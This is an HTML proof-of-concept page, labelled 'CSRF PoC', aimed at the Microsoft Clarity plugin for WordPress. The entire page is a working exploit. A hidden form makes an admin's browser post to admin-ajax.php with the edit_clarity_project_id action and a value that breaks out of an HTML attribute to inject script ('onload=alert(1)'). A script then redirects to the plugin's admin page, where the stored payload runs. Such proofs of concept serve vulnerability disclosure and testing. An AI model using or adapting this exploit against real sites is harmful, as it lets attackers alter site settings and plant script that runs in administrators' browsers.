<!DOCTYPE html>
<html>
   <body>
<script>
 function run_exploit(){
	 form1.setAttribute('action', form1.target.value+form1.getAttribute('action'));
	 setTimeout(()=>{
		 window.location=document.getElementById("target").value+"/wp-admin/admin.php?page=microsoft-clarity"
	 },2000)
 }
	</script>
      <h1>CSRF PoC</h1>
      <form action="/wp-admin/admin-ajax.php" method="POST" name=form1 id=form1 target="_blank">
        Enter your target:
         <input id=target name=target placeholder="https://yourserver:1337">
         <input type="hidden" name="action" value="edit_clarity_project_id" />
         <input type="hidden" name="new_value" value='" onload=alert(1) x="' />
         <input type="submit" onclick=run_exploit()  value="Submit request" />
      </form>
   </body>
</html>
